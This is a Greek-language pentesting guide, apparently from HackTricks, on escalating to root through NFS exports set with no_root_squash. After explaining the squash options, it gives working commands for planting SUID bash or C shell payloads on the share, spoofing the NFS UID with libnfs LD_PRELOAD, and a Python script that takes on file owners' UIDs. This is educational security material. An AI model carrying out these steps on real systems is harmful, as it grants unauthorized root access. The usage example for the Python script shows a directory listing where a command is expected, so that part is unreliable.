# NFS No Root Squash: Κλιμάκωση προνομίων λόγω εσφαλμένης διαμόρφωσης

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες για το Squashing

Με το NFS AUTH_SYS/AUTH_UNIX, ο server βασίζει τους ελέγχους δικαιωμάτων αρχείων στα `uid` και `gid` που παρέχονται σε κάθε αίτημα RPC. Άλλα security flavors, όπως το Kerberos, χρησιμοποιούν διαφορετικά διαπιστευτήρια και ο server μπορεί να αντιστοιχίσει τα αριθμητικά διαπιστευτήρια πριν ελέγξει τα δικαιώματα.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Αντιστοιχίζει κάθε UID και GID στον ανώνυμο λογαριασμό, ο οποίος στο Linux είναι από προεπιλογή ο `nobody` (65534). Το `no_all_squash` είναι η προεπιλογή για αιτήματα που δεν προέρχονται από root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Είναι η προεπιλογή στο Linux και αντιστοιχίζει τα αιτήματα με UID/GID 0 (root) στον ανώνυμο λογαριασμό· τα υπόλοιπα UID και GID δεν γίνονται squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Απενεργοποιεί το root squashing, οπότε τα αιτήματα με UID/GID 0 μπορούν να αξιολογηθούν ως root στον server.<sup>[[4]](#references)</sup>

Αν ένας επιτρεπόμενος client μπορεί να κάνει mount ένα writable export στο **`/etc/exports`** που έχει διαμορφωθεί με **`no_root_squash`**, τα αιτήματά του με UID/GID 0 μπορούν να γράψουν εκεί ως ο root user του server.<sup>[[4]](#references)</sup>

Το `root_squash` αντιστοιχίζει μόνο το UID/GID 0· με AUTH_SYS, το **μη μηδενικό αριθμητικό UID/GID** ενός επιτρεπόμενου client μπορεί και πάλι να αντιστοιχεί σε διαφορετικό λογαριασμό στον server. Επομένως, ένα writable export μπορεί να αποτελέσει διαδρομή μεταξύ διαφορετικών χρηστών ακόμη και με ενεργό root squashing, αν ο client μπορεί να δημιουργήσει ένα αρχείο με αυτή την αριθμητική ταυτότητα και ο server επιτρέπει την πρόσβαση. Για handoff μέσω SUID/SGID, επαληθεύστε επίσης τον τελικό ιδιοκτήτη του αρχείου, την πρόσβαση για εκτέλεση, αν το mount του server έχει ενεργό `nosuid`, τα ACL και το SELinux ή άλλες πολιτικές. Μόνο το όνομα διαδρομής του export, η επιλογή `rw` ή η αντιστοίχιση αριθμών δεν αποδεικνύουν ότι επιτρέπεται η πρόσβαση στον client, ότι το export είναι ενεργό ή ότι οι δύο hosts έχουν την ίδια αποτελεσματική αντιστοίχιση ταυτότητας. Εξετάστε παθητικά το `/etc/exports` και τα τοπικά metadata· μην κάνετε mount νέου share ή δημιουργήσετε δοκιμαστικό αρχείο κατά την απαρίθμηση.<sup>[[4]](#references)[[5]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με το **NFS**, δείτε:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Κλιμάκωση προνομίων

### Remote Exploit

Επιλογή 1 με χρήση του bash:
- Σε έναν επιτρεπόμενο client, κάντε mount ένα writable export ως root, αντιγράψτε το **`/bin/bash`** σε αυτό, ορίστε το bit **SUID** και εκτελέστε το από ένα mount του θύματος που δεν χρησιμοποιεί `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Για να παραμείνει το ανεβασμένο αρχείο ιδιοκτησία του root, ο server πρέπει να χρησιμοποιεί **`no_root_squash`**. Αν το root γίνεται squash, είναι δυνατό να δημιουργηθεί SUID binary για άλλον λογαριασμό μόνο αν ο client μπορεί νόμιμα να το δημιουργήσει ή να το έχει στην ιδιοκτησία του με το αριθμητικό UID/GID αυτού του λογαριασμού.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 με χρήση compiled C code:
- Κάντε mount τον κατάλογο από έναν επιτρεπόμενο client, αντιγράψτε ένα compiled payload που εκμεταλλεύεται τα SUID permissions, ορίστε το bit **SUID** και εκτελέστε το από το victim (δείτε μερικά [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ισχύουν οι ίδιοι περιορισμοί όπως πριν

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **tunnel από το μηχάνημά σας προς το μηχάνημα-θύμα, μπορείτε και πάλι να χρησιμοποιήσετε την έκδοση Remote για να εκμεταλλευτείτε αυτό το privilege escalation, διοχετεύοντας μέσω tunnel τις απαιτούμενες θύρες**.\
> Το ακόλουθο τέχνασμα είναι χρήσιμο όταν το `/etc/exports` περιορίζει το export στη διεύθυνση IP του θύματος: ο απομακρυσμένος client δεν μπορεί να το προσαρτήσει, αλλά η τοπική τεχνική μπορεί να λειτουργήσει μέσω του share που είναι ήδη προσαρτημένο στον επιτρεπόμενο host.<sup>[[2]](#references)</sup>\
> Για αυτήν τη μέθοδο libnfs χωρίς προνόμια, το export στο **`/etc/exports`** πρέπει να χρησιμοποιεί τη σημαία `insecure`, ώστε η διεργασία να μπορεί να χρησιμοποιήσει μη δεσμευμένη θύρα προέλευσης· η προεπιλογή είναι `secure`, αν και μια διεργασία που μπορεί να δεσμεύσει δεσμευμένη θύρα δεν χρειάζεται αυτήν την επιλογή.<sup>[[1]](#references)[[4]](#references)</sup>

### Βασικές πληροφορίες

Ένας client NFSv3 AUTH_UNIX συμπεριλαμβάνει το effective UID, το GID και τις ομάδες του σε κάθε κλήση, και ο server τα χρησιμοποιεί για ελέγχους δικαιωμάτων. Αυτή η τοπική τεχνική εκμεταλλεύεται αυτό το μοντέλο πλαστογραφώντας τα RPC credentials μέσω του [libnfs](https://github.com/sahlberg/libnfs)· το preload module του υποστηρίζει την παράκαμψη των UID/GID στο NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Μεταγλώττιση της βιβλιοθήκης

Το παράδειγμα libnfs ενδέχεται να χρειάζεται προσαρμογές για τον kernel του στόχου· ο οδηγός που χρησιμοποιείται εδώ επισημαίνει συγκεκριμένα ότι πρέπει να σχολιαστούν οι κλήσεις συστήματος fallocate πριν από τη μεταγλώττιση του preload module.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Εκτέλεση του exploit

Το παράδειγμα δημιουργεί ένα μικρό C helper που εκκινεί ένα shell, έπειτα το τοποθετεί στο share και χρησιμοποιεί το `ld_nfs.so` με UID 0 στο πλαίσιο του NFS για να το κάνει SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Μεταγλωττίστε τον κώδικα του exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Τοποθετήστε το exploit στο share και τροποποιήστε τα δικαιώματά του πλαστογραφώντας το UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Εκτελέστε το exploit για να αποκτήσετε δικαιώματα root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Μπόνους: NFShell για διακριτική πρόσβαση σε αρχεία

Μόλις αποκτηθεί πρόσβαση root, αυτό το μοτίβο `nfsh.py` ορίζει το effective UID στο UID του αρχείου-στόχου πριν εκτελέσει μια εντολή, επιτρέποντας την πρόσβαση χωρίς αναδρομική αλλαγή ιδιοκτησίας.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Εκτελέστε ως εξής:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Μια ιστορία για ένα λιγότερο γνωστό NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Εγχειρίδιο Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Προδιαγραφή πρωτοκόλλου NFS έκδοσης 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
